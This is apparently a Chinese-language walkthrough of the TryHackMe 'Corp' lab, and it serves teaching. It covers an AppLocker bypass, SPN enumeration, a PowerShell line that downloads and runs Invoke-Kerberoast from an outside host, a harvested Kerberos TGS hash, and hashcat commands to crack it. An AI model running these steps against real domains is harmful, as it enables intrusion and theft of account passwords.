# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务发现
```
┌──(root💀kali)-[~/tryhackme/Corp]
└─# nmap -sV -Pn 10.10.220.138 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-19 04:00 EST
Nmap scan report for 10.10.220.138
Host is up (0.30s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-19 09:01:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: corp.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: corp.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: OMEGA; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.74 seconds

```


用```corp\dark:_QuejVudId6```登录靶机

## 什么是AppLocker？
> AppLocker 是 Windows 7 中引入的应用程序白名单技术。它允许根据程序路径、发布者和哈希限制用户可以执行哪些程序。

## 如何绕过AppLocker？
> 如果 AppLocker 配置了默认的 AppLocker 规则，我们可以通过将我们的可执行文件放在以下目录中来绕过它：  C:\Windows\System32\spool\drivers\color - 默认情况下这是白名单


## windows版本的bash history
就像Linux bash 一样，Windows powershell 将所有以前的命令保存到一个名为ConsoleHost_history的文件中

在windows中，这个文件通常是在：
> %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_h istory.txt


## 枚举所有账户信息
> setspn -T medin -Q */*
```
PS C:\users\dark\appdata\roaming\Microsoft\Windows\PowerShell\PSReadLine>  setspn -T medin -Q */*
Ldap Error(0x51 -- Server Down): ldap_connect
Failed to retrieve DN for domain "medin" : 0x00000051
Warning: No valid targets specified, reverting to current domain.
CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
        ldap/omega.corp.local/ForestDnsZones.corp.local
        ldap/omega.corp.local/DomainDnsZones.corp.local
        TERMSRV/OMEGA
        TERMSRV/omega.corp.local
        DNS/omega.corp.local
        GC/omega.corp.local/corp.local
        RestrictedKrbHost/omega.corp.local
        RestrictedKrbHost/OMEGA
        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        HOST/OMEGA/CORP
        HOST/omega.corp.local/CORP
        HOST/OMEGA
        HOST/omega.corp.local
        HOST/omega.corp.local/corp.local
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
        ldap/OMEGA/CORP
        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        ldap/omega.corp.local/CORP
        ldap/OMEGA
        ldap/omega.corp.local
        ldap/omega.corp.local/corp.local
CN=krbtgt,CN=Users,DC=corp,DC=local
        kadmin/changepw
CN=fela,CN=Users,DC=corp,DC=local
        HTTP/fela
        HOST/fela@corp.local
        HTTP/fela@corp.local
```

## 下载脚本到靶机
> iex (New-Object  Net.WebClient).DownloadString('http://10.13.21.169:8000/Invoke-Kerberoast.ps1')

## 引入脚本，枚举出哈希
```
PS C:\users\dark\Desktop>  Invoke-Kerberoast -OutputFormat hashcat |fl


TicketByteHexStream  :
Hash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$FCADF21005AC9CBF1C4804E9A917359D$0CBAB927BD882E862B06486B73E806082F04815A4312565D0DBA3D4C9952FE4FF80570F3014C6AEC95D09D07C594DF348D5A5392F22060E03D062A032DEFA3E348CAC2998929
                       3AB4AEF2EF227B3C80EB1DD4BFBEFC6E0DD69DA6CF0B02CF8FD667413832CDB69AAEF9284F36E209EA95114A7DE1DCB8C35AE5A18DD84AD80660C5EA4043F249B925B5B178B2A1C9DB7A7A2C37E8F6CC3FDD5755014FB17D2BD67F95208D306718D09B8BFA860EDA94078
                       D73560C86BFD0296C0B7B1F0ADF986BDEE214040E96DA7035AB3197B351D84BBFE3AC38291D9CF92CF77E065F215FB13D183CCD990E832C128D6517A63468FB13EA360D4C405356C7DB56F18EE7DE80FD20407FBD734DD6FB8B5F9C99A4EE0F7C1095B47D549518024D9D
                       1CC3792F7FB9732C639FD4780DD9D8ED4E49561E3D646F9163BFE9687592A575C3705223A1197851F0A0BAB50E0BCEADA010B5B559BDF9DDE00C323AA44F9F24C28B326C0F49A5C7F8BEFABE4B9E298CEDD605116CE7BFF242D2DBF8BA674D91B4EE3D0DA281749AAE9FF
                       C1543C9ECC87F83B6D600F15F7EE97D257EF78D9B66FCC1C756071F844B80E973EDFFA71A8E7142A12F5F4E8FF7D7F97B24EC7C4E4CC613824D92C5B633E2F8752AF4402318EE5C9273508388B19396624CD6FEB4F0A9A9ACADC71B411918BD77CA6A80C0C31A07142369
                       94C207AC95EC345018C98B9AE3425897EB3E73BE734B17207C186FE02AA3E633BF900F8FB280BD4DB343D1C30D0A76810351B08D37ADC2F2D0E8DA149A3A37289B6AE7E7DC177125D73D365466D59C46615A88BFB14572CE485250C988B2687781D4D8D5F3A3DD143A9A4
                       4C4A36138CEBA5D8C0114248AC2ACB7092AD8F56D70DAC41D41D8B0D2CDC30066C470208C49B4A5BAF1635B99D7D66B3909FE6B92ADD9ACDD603CFB3A348CB9AEC953C16D008057E0C025C388F319D4D20F6B99DCEB21C19C67215F8DD6D16C217A3ED8FF5D74FF2B6B4C
                       3B2362F22966C984D216354116B56D550C299A90139B1A8858B9100247F28B0B6BF782B2BF984547E22DE4C77EF6C94563F17C7FA219056AE1F9CE541B4ED3EA9E78AEED3848E1F8D333F6A4B0250995C3316F92B5E97692880E7FE7D5DF4D7230467ED5FC32112FE8C16
                       D6ED03F3F590BE99BB30BA9A3FAC4E50B9D6B818A00CFA990F4214DBA5C9B0BC9D1F68E18FF110917EB57128316E087CA4305E9D1A15C9A48C58490EED4C47FCF93C5CCDC7B6B104933AA47AE22EE457F387ADE66FB3D401D23E06BB7F5B3981DE34877B60BBD0BBE8678
                       751A1D5A391BC8F52DBFFFD90D7F03F9EE6C0DEE722034CCEA60D99E04213E9B41085C703CEDE65DD13E78AE4BC3A2EBAEAAA639D46AF8A96266A1E4DCC9F5E1D45543686620B9
SamAccountName       : fela
DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
ServicePrincipalName : HTTP/fela
```

把哈希保存到hash.txt，识别哈希类型：
```
┌──(root💀kali)-[~/tryhackme/Corp]
└─# name-that-hash -f hash.txt 

  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    

$krb5tgs$23$*fela$corp.local$HTTP/fela*$FCADF21005AC9CBF1C4804E9A917359D$0CBAB927BD882E862B06486B73E806082F04815A4312565D0DBA3D4C9952FE4FF80570F3014C6AEC95D09D07C594DF348D5A5392F22060E03D062A032DEFA3E348CAC2998929

Most Likely 
Kerberos 5 TGS-REP etype 23, HC: 13100 JtR: krb5tgs Summary: Used in Windows Active Directory.

```

哈希类型为：```Kerberos 5 TGS-REP etype 23```



hashcat -m 13100 -​a 0 hash.txt wordlist --force

hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force 

hashcat -m 13100 -a 0 hash.txt  --force

hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force